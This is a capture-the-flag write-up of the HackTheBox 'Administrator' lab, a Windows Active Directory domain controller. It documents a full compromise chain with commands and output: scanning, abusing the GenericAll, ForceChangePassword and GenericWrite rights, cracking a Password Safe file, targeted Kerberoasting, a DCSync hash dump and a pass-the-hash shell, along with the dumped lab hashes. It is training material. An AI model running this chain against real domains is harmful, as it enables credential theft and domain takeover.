---
title: "Administrator | HackTheBox"
description: "And here we go again! It’s Maverick back with another AD machine this time, we’re flying through aHack The Box medium-rated box."
pubDate: 2025-04-24
tags: ["Security Research", "Red Team"]
author: "Mohamed Eletrepy (maverick)"
readingTime: 13
coverImage: "https://cdn-images-1.medium.com/max/800/0*JEY6HgWMDnDvZPUu.jpg"
---

---

![](https://cdn-images-1.medium.com/max/800/0*JEY6HgWMDnDvZPUu.jpg)

### Administrator | HackTheBox

And here we go again! It’s Maverick back with another AD machine this time, we’re flying through a **Hack The Box medium-rated box**.

Now, I’m not gonna lie… there’s nothing “new” in this machine **but don’t confuse “not new” with “not important.”** This box packs a sweet combo of **DACL misconfigurations**, and that’s *more than enough* to make me pull out my lab coat and start dissecting.

We’re talking:

- `GenericAll`
- `GenericWrite`
- `ForceChangePassword`
- And the classic `Targeted Kerberoasting`

All these stack up beautifully into a juicy **DCSync** attack. And that’s basically the whole show. If you ask me? This machine is *assume breach* from the get-go.

Now enough chit-chat…
 **Time to hit it with some scans LET’S GOOOOOOO**

![](https://cdn-images-1.medium.com/max/800/0*HqaQOzJEgKIuoHeG.gif)

---

#### Nmap

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# mavscan 10.10.11.42  
  
[+] Scanning 10.10.11.42...  
[+] Open ports: 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,50253,50258,50277,50280,50312,53889  
[+] Running -sCV on open ports...  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-21 10:29 EDT  
Nmap scan report for 10.10.11.42  
Host is up (0.22s latency).  
  
PORT STATE SERVICE VERSION  
21/tcp open ftp Microsoft ftpd  
| ftp-syst:  
|_ SYST: Windows_NT  
53/tcp open domain Simple DNS Plus  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-21 21:31:45Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open tcpwrapped  
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)  
3269/tcp open tcpwrapped  
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
9389/tcp open mc-nmf .NET Message Framing  
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
49664/tcp open msrpc Microsoft Windows RPC  
49665/tcp open msrpc Microsoft Windows RPC  
49666/tcp open msrpc Microsoft Windows RPC  
49667/tcp open msrpc Microsoft Windows RPC  
49668/tcp open msrpc Microsoft Windows RPC  
50253/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
50258/tcp open msrpc Microsoft Windows RPC  
50277/tcp open msrpc Microsoft Windows RPC  
50280/tcp open msrpc Microsoft Windows RPC  
50312/tcp open msrpc Microsoft Windows RPC  
53889/tcp open msrpc Microsoft Windows RPC  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:  
| date: 2025-04-21T21:32:38  
|_ start_date: N/A  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
|_clock-skew: 7h02m19s  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 83.98 seconds  
[+] Scan for 10.10.11.42 completed!  
[+] All scans done! Results saved in mavscan_results.txt
```

As usual, it’s a Domain Controller running the classic services — LDAP, Kerberos, DNS… you know the drill. But there’s a twist this time — **FTP?!** Like bro, what are you doing here? 😅

---

Anyway, I’m gonna start enumerating every single service and see what shakes out. But yo, don’t forget **if you have valid creds, there are certain things you *should* be checking**. And since we’re in an *assume breach* scenario, that means yes, **we do have valid creds**.

So the question is **what should I check if I have valid credentials?** That’s where the real fun begins.

![](https://cdn-images-1.medium.com/max/800/0*65z2lhRB9ushFaO1.gif)

If you have valid creds, there are a lot of things you can do. First thing — you have to check which service those creds are valid on. Then go on and use them to collect valid users, because that can really help you with password spraying. Next, check for **Kerberoastable** users and **AS-REP roastable** users. After that, look for common AD vulns like **PrinterBug**, **PetitPotam**, and **EFSCoerce**, because these can help you perform **relay attacks**. Then, check for high-impact vulns like **NoPac**, **Zerologon**, or even **GoldenPac** — because if the DC is vulnerable to those, damn, you can compromise the whole domain with just one exploit. These are the things you *have* to check. Okay… what’s next??

Next, use the usual enumeration plan like mapping the whole domain with BloodHound, and make sure to use the **latest updated ingestor** for that — like the latest SharpHound or BloodHound CE. Okay? And always stay updated with the community for tips and tricks on good cyphers for BloodHound, because they’re super helpful. Now we’re logging into the domain using **PowerShell Remoting** either through **Evil-WinRM** or **RDP**. So what should I do? For me, I love the **ActiveDirectory module** — I’ll import it and use the usual techniques for enumeration, like checking users, GPOs, groups, group members, and so on. And of course, **DACLs** because for me, they’re the **nerve cells** of Active Directory. Once I find any malicious one, I’ll jump straight to abusing it. But **always consider OPSEC** don’t just start running commands blindly without understanding the impact on the domain. Tbh, you really have to learn how a SOC operates if you wanna be a solid pentester or red teamer.

Damn, I forgot one of the most important things it’s **of course ADCS vulnerabilities**! You must always check for that. Use **Certipy** on Linux or **Certify** on Windows. And if you’re a reverse engineering boy… bro, please compile Certipy for me ’cause I need to try it on Windows 🤣🤣

![](https://cdn-images-1.medium.com/max/800/1*Ld2wen3GfFPQ9ZcQ5X8Fkw.png)

> Always use different tools and be vertical with your arsenal — mix it up, diversifyand always keep OPSEC considerations in check.

Now I think I’ve shared a nice summary of the enumeration plan for AD. Of course, it’s not complete, but I’m sure it will help you. Keep in mind, I haven’t mentioned things like MSSQL Server or SCCM there will be posts for those.

---

![](https://cdn-images-1.medium.com/max/800/0*Y4Jlc9_B4YEDiSp5.gif)

Back to our track with service enumeration — let’s start with FTP anonymous login and also test for our creds.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# ftp 10.10.11.42  
Connected to 10.10.11.42.  
220 Microsoft FTP Service  
Name (10.10.11.42:kali): anonymous  
331 Password required  
Password:  
530 User cannot log in.  
ftp: Login failed  
ftp> exit  
221 Goodbye.
```

Next, SMB? Yes

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# nxc smb 10.10.11.42 -u olivia -p ichliebedich  
SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.42 445 DC [+] administrator.htb\olivia:ichliebedich
```

Is there anything interesting with shares? Nope. But as I said before, there are a lot of things you can do. I’ll leave that to you, bruh, this time

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# nxc smb 10.10.11.42 -u olivia -p ichliebedich --shares  
SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.42 445 DC [+] administrator.htb\olivia:ichliebedich  
SMB 10.10.11.42 445 DC [*] Enumerated shares  
SMB 10.10.11.42 445 DC Share Permissions Remark  
SMB 10.10.11.42 445 DC ----- ----------- ------  
SMB 10.10.11.42 445 DC ADMIN$ Remote Admin  
SMB 10.10.11.42 445 DC C$ Default share  
SMB 10.10.11.42 445 DC IPC$ READ Remote IPC  
SMB 10.10.11.42 445 DC NETLOGON READ Logon server share  
SMB 10.10.11.42 445 DC SYSVOL READ Logon server share
```

Now it’s time for mapping the domain with BloodHound-CE. Don’t forget, you can use SharpHound this time since you have access to PowerShell remoting

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# bloodhound-ce-python -d administrator.htb -u Olivia -p ichliebedich -c all -ns 10.10.11.42  
INFO: BloodHound.py for BloodHound Community Edition  
INFO: Found AD domain: administrator.htb  
INFO: Getting TGT for user  
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known  
INFO: Connecting to LDAP server: dc.administrator.htb  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 1 computers  
INFO: Connecting to LDAP server: dc.administrator.htb  
INFO: Found 11 users  
INFO: Found 53 groups  
INFO: Found 2 gpos  
INFO: Found 1 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: dc.administrator.htb  
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.  
WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.42:445)] timed out  
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.  
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.  
INFO: Done in 00M 48S
```

After uploading the data from BloodHound-CE Python, I set the Olivia user as the owner, then checked the outbound objects, and here’s what I got

![](https://cdn-images-1.medium.com/max/800/1*Lwrj-JXRT7aph6-qrdSAhA.png)

Here we go! I have GenericAll on Michael, which means I can do whatever I want with that user. I’ll just choose to change his password because I’m a good man, not a bad bro. You should know that

I’ll do that using `net rpc`. You can also use something like BloodyAD, it’s good too.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# net rpc password "michael" "Maverick" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.10.11.42  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# nxc smb 10.10.11.42 -u michael -p Maverick  
SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.42 445 DC [+] administrator.htb\michael:Maverick
```

I checked for WinRM too because, as you know, it’s part of the enumeration plan. And it’s valid for WinRM! 🤣🤣

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# nxc winrm 10.10.11.42 -u michael -p Maverick  
WINRM 10.10.11.42 5985 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.  
arc4 = algorithms.ARC4(self._key)  
WINRM 10.10.11.42 5985 DC [+] administrator.htb\michael:Maverick (Pwn3d!)
```

As you can see in the image above, Michael has `ForceChangePassword` for Benjamin. So, once again, let’s change Benjamin’s password.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# net rpc password "benjamin" "Maverick" -U "administrator.htb"/"michael"%"Maverick" -S 10.10.11.42  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# nxc smb 10.10.11.42 -u benjamin -p Maverick  
SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.42 445 DC [+] administrator.htb\benjamin:Maverick  
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# nxc winrm 10.10.11.42 -u benjamin -p Maverick  
WINRM 10.10.11.42 5985 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.  
arc4 = algorithms.ARC4(self._key)  
WINRM 10.10.11.42 5985 DC [-] administrator.htb\benjamin:Maverick
```

As I mentioned in the enumeration plan, once you have creds for any user, you have to check their validity across all services as much as you can. This time, Benjamin has access to FTP

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# nxc ftp 10.10.11.42 -u benjamin -p Maverick  
FTP 10.10.11.42 21 10.10.11.42 [*] Banner: Microsoft FTP Service  
FTP 10.10.11.42 21 10.10.11.42 [+] benjamin:Maverick
```

back to bloodhound with benjamin

![](https://cdn-images-1.medium.com/max/800/1*1ZaqVJnOOnLpverRzuEiWw.png)

Enumerating for Benjamin’s user using the `net` command, and you should know that it’s not the best OPSEC to use the `net` command because EDRs love that

```powershell
*Evil-WinRM* PS C:\inetpub> net user benjamin  
User name benjamin  
Full Name Benjamin Brown  
Comment  
User's comment  
Country/region code 000 (System Default)  
Account active Yes  
Account expires Never  
  
Password last set 4/22/2025 8:20:15 AM  
Password expires Never  
Password changeable 4/23/2025 8:20:15 AM  
Password required Yes  
User may change password Yes  
  
Workstations allowed All  
Logon script  
User profile  
Home directory  
Last logon 4/22/2025 8:22:52 AM  
  
Logon hours allowed All  
  
Local Group Memberships *Share Moderators  
Global Group memberships *Domain Users  
The command completed successfully.  
  
*Evil-WinRM* PS C:\inetpub>
```

Share Moderators ?? ?? amm let’s back to ftp

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# ftp 10.10.11.42  
Connected to 10.10.11.42.  
220 Microsoft FTP Service  
Name (10.10.11.42:kali): benjamin  
331 Password required  
Password:  
230 User logged in.  
Remote system type is Windows_NT.  
ftp> ls  
229 Entering Extended Passive Mode (|||58357|)  
125 Data connection already open; Transfer starting.  
10-05-24 09:13AM 952 Backup.psafe3  
226 Transfer complete.  
ftp> get Backup.psafe3  
local: Backup.psafe3 remote: Backup.psafe3  
229 Entering Extended Passive Mode (|||58360|)  
125 Data connection already open; Transfer starting.  
100% |********************************************************************************| 952 3.22 KiB/s 00:00 ETA  
226 Transfer complete.  
WARNING! 3 bare linefeeds received in ASCII mode.  
File may not have transferred correctly.  
952 bytes received in 00:00 (2.15 KiB/s)  
ftp>
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# file Backup.psafe3  
Backup.psafe3: Password Safe V3 database
```

.psafe it’s my first time seeing that, but I searched for it and found out it’s a database type. I can crack it using Hashcat

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6) starting  
  
OpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]  
============================================================================================================================================  
* Device #1: cpu-sandybridge-AMD Ryzen 7 4800H with Radeon Graphics, 2643/5350 MB (1024 MB allocatable), 4MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Single-Hash  
* Single-Salt  
* Slow-Hash-SIMD-LOOP  
  
ATTENTION! Potfile storage is disabled for this hash mode.  
Passwords cracked during this session will NOT be stored to the potfile.  
Consider using -o to save cracked passwords.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory required for this attack: 1 MB  
  
Dictionary cache hit:  
* Filename..: /usr/share/wordlists/rockyou.txt  
* Passwords.: 14344385  
* Bytes.....: 139921507  
* Keyspace..: 14344385  
  
Backup.psafe3:tekieromucho  
  
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 5200 (Password Safe v3)  
Hash.Target......: Backup.psafe3  
Time.Started.....: Tue Apr 22 04:29:06 2025 (1 sec)  
Time.Estimated...: Tue Apr 22 04:29:07 2025 (0 secs)  
Kernel.Feature...: Pure Kernel  
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#1.........: 11523 H/s (5.12ms) @ Accel:64 Loops:1024 Thr:1 Vec:8  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 4864/14344385 (0.03%)  
Rejected.........: 0/4864 (0.00%)  
Restore.Point....: 4608/14344385 (0.03%)  
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2048-2049  
Candidate.Engine.: Device Generator  
Candidates.#1....: Liverpool -> denis  
Hardware.Mon.#1..: Util: 61%  
  
Started: Tue Apr 22 04:28:36 2025  
Stopped: Tue Apr 22 04:29:08 2025
```

install psafe

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# sudo apt install passwordsafe --fix-missing
```

![](https://cdn-images-1.medium.com/max/800/1*UNQ2XK0mTq4E8sx-o5VXlQ.png)

![](https://cdn-images-1.medium.com/max/800/1*zV_ngNEfDw_ZmmM1wpsoMg.png)

Login with the password we just cracked, and the file for that is in the moderators share.

![](https://cdn-images-1.medium.com/max/800/1*XPu_Xp4X7MlrXmKgs9q1Og.png)

![](https://cdn-images-1.medium.com/max/800/1*KXCKArB8ENmKL4elKMNeMQ.png)

It seems there are usernames and their passwords, which means we can perform a password spraying attack, right?

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# nxc smb 10.10.11.42 -u alexander -p 'UrkIbagoxMyUGw0aPlj9B0AXSea4Sw'  
SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.42 445 DC [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# nxc smb 10.10.11.42 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'  
SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.42 445 DC [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# nxc smb 10.10.11.42 -u emma -p 'WwANQWnmJnGV07WQN8bMS7FMAbjNur'  
SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.42 445 DC [-] administrator.htb\emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE
```

Check for powershell remoting on emily

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# nxc winrm 10.10.11.42 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'  
WINRM 10.10.11.42 5985 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.  
arc4 = algorithms.ARC4(self._key)  
WINRM 10.10.11.42 5985 DC [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)
```

back to bloodhound and set emily as owned and see that

![](https://cdn-images-1.medium.com/max/800/1*QZyv80dp9zpoLCyFbLxMfA.png)

Damn, again GenericWrite? What can we do? Honestly, there are two options: one is targeting Kerberoasting techniques, and the other is using shadow credentials. But in this case, there’s no `msDS-KeyCredentialLink` attribute, so we’re back to targeting Kerberoasting. I'll choose Charlie Bromberg's script to do that.

```bash
┌──(root㉿kali)-[/opt/Arsenal/targetedKerberoast]  
└─# uv add --script targetedKerberoast.py -r requirements.txt   
Updated `targetedKerberoast.py`  
  
┌──(root㉿kali)-[/opt/Arsenal/targetedKerberoast]  
└─#  uv run targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb  
      Built impacket==0.12.0  
Installed 26 packages in 112ms  
[*] Starting kerberoast attacks  
[*] Fetching usernames from Active Directory with LDAP  
[VERBOSE] SPN added successfully for (ethan)  
[+] Printing hash for (ethan)  
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$cd851636e11c6a0aa7795e6f8613778c$4f94a8988b7eb4c270025b8d642a54b9ec8a13163068b7d201a1c8c271049677955853a7344ed6cfd54ebffa6a9c37e9196cfd6d60d7cddaecb38b0739b3fc63bca4049d2dd004e8f8ba3480a88ba800a65275e324f34ea791ceaf68878e178924e0b13c0690f4a569988ef896f933e90f99ee32dda305d595499a1ba0edad892ec43e8454c38107eee81a8d98702cf0e8d0b4c897d07326ae67741490f284bf7841afbfeb801c5bc557be7f5868c65001776b52434635706d078187ce961979819b77e857cb4d4e21b0d42f004043427a89727d34df3d9554cdce971309e08e46123b8959412f5ed72562c1586191a4d04de8f9aac1b9288bf7349892358fa407169245e56f64409f95b3c9cd1d5d4325c83ec82ffe64299cf7afc0c3d5468ee9d85d57ea064c455d7a2a33296f56892aeb9d7d4dfe36344617aebc328f687b0e11f5e60e1b8e40e3448c84061f89a425f0417f8982f62985cd7274ee9515c7df35a315a2da56e4137c85671428a7d409ab2f27a6e89ebd3767290ceb3655eca098b6d725790377441a128b6341db9af415bd42d9634b4417388aad67d474da659b05b0ec328aa235fbb70df4451cccb5701c424f4d3829971e21ed3d0cf94074ca2e22dbb1f682f7649ddf7f36825efc8d7fb85fdbab5aa96d1a8999513c3da06b8fe02e5329886957df5a7a0493f4c23b3eb84d0e19a12794dca7095b357157fe299a64dcacd5bccd80dc3d1cc769fda90541c3d12c57df5f19d28a9d9df9f50bd4504cedab747c94a1902c5c5d58df702ad3b64cd4adea49c993587e74e8afab39ff743f0decd0881861b84ebcb72b7a4f5599c9bd271f24d8ee382f506bc029f2417a76a164c69c8192acad1da4b28b5d10b9ea65c87772f7addfa57123515f128c44970f77c2f710c1c40b01f6315b9949b366f997b332b5aec7072bc5109f18574e3f3427d17992a418c5c9756fe8a981736f02b33cd2875d6154b63b0eaf9b3f0e01309fdc838010e322c69db76139f84d6eb6769b316bc0064007605f393edd32713ccb894ada031b9dbb8d5502b12cd1b184333a78cb0d9247b10f28394b6bf30b40b40f322251ff2c1d42dfceb610256e2872d79b7bcfe99d5acb241acbe1a6506bc0448270f47bd504db0671b33af871c13e587160221bf9f515eb207c30584a436e7ac0fafcf0efe84d1a7bdfef91bfb9693642bf073cce3cbd03eeb61d9e23eac8ad8d5ab28803ffea50251a0dcc458eee54270a34b9ee1aaf2e50383f7226ce395e18b151c4f112ff465471c557ea925252005d4088c67cb24603d149c4f22667bede15c86832d5ebe4423d42f06ef9af5fd90c447931ef3b949308ab648ec34d26c761c6ab4589c91a908f841e8419dc4b1825483b59b9eb8a989dead2b361a8e9aefc00f208e3c438e5506e3e0476e37ed09eba7d0983f6e17e73caab0faa404bdc4d9446341bc8f9ca03d3ec851900c9f5994680762cbfa6748ce1b202a98f2a4bd110ca7944eb776b02b0d439f0d947b4cc8e25b272  
[VERBOSE] SPN removed successfully for (ethan)
```

It’s my first time using UV, and it’s awesome. Thanks to 0xdf for teaching me that! But I need to use it for `netexec`, and I’m not sure how to do that yet. I’ll search for it later, but UV is faster for establishing Python tools compared to pip or pipx

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# netexec smb administrator.htb -u ethan -p limpbizkit  
SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.42 445 DC [+] administrator.htb\ethan:limpbizkit  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# netexec winrm administrator.htb -u ethan -p limpbizkit  
WINRM 10.10.11.42 5985 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.  
arc4 = algorithms.ARC4(self._key)  
WINRM 10.10.11.42 5985 DC [-] administrator.htb\ethan:limpbizkit
```

Can’t access WinRM? No problem, I already have DCSync, right

![](https://cdn-images-1.medium.com/max/800/1*9cerbyEYQ0nHhLf-B0Z9Yw.png)

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# impacket-secretsdump ethan:==limpbizkit==@dc.administrator.htb  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied  
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
[*] Using the DRSUAPI method to get NTDS.DIT secrets  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::  
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::  
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:fa0289b27a383b2333b3d3cd8092036c:::  
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:fa0289b27a383b2333b3d3cd8092036c:::  
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::  
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::  
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::  
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::  
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::  
[*] Kerberos keys grabbed  
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664  
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2  
Administrator:des-cbc-md5:403286f7cdf18385  
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648  
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94  
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7  
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3  
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48  
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9  
administrator.htb\michael:aes256-cts-hmac-sha1-96:60f57ef5cfb7371a9076bf3bc8f336ba346df3d97f29f859518df7ee49b8da51  
administrator.htb\michael:aes128-cts-hmac-sha1-96:b8eef0676046ebe0a8d2b03fd0c5b108  
administrator.htb\michael:des-cbc-md5:f47cd5e07f702313  
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:e7916fa5a93d8a77b5a3af8e8ac6efe60cb75fb6b27d9bcf6dc12aa16e425367  
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:4e2c396a68e9519cbcedb0a0d7c91bdc  
administrator.htb\benjamin:des-cbc-md5:a8f85d02eaad3761  
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4  
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218  
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51  
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f  
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f  
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb  
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6  
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade  
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf  
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82  
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e  
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d  
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb  
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d  
DC$:des-cbc-md5:f483547c4325492a  
[*] Cleaning up...
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/administrator]  
└─# evil-winrm -i dc.administrator.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e  
  
Evil-WinRM shell v3.7  
  
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline  
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

